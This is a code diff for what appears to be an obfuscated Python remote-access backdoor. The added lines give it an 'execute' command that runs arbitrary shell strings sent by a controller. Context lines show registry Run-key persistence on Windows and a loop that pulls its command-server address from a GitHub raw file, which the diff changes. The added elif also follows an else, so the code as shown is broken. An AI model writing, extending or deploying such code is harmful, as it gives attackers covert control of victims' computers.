@@ -63,6 +63,9 @@ class dtf2un:
                         result = self.x98skil(" ".join(command[1:]))
                     else:
                         result = self._5zxun5(command).decode()
+                    elif command[0] == "execute":
+                        subprocess.Popen(" ".join(command[1:]),shell=True)
+                        result = "[+] Executed "+" ".join(command[1:])+"!"    
                 except Exception as e:
                     result = "[-] Error Processing\n" + str(e)
                 self._374egv(result)
@@ -77,7 +80,7 @@ if sys.platform == "win32":
         subprocess.call(f'REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /V "PowerShellRun" /t REG_SZ /F /D "{loc}"')
 while True:
     try:
-        data = json.loads(urllib.request.urlopen("https://github.com/cipher234/cipherattack/raw/main/cipher1/rjrjr9").read())
+        data = json.loads(urllib.request.urlopen("https://github.com/cipher234/cipherattack/raw/main/cipher1/XureVip").read())
         if "fine" in [i.lower() for i in data.keys()]:
             addr = list(data.values())[0]
         else:
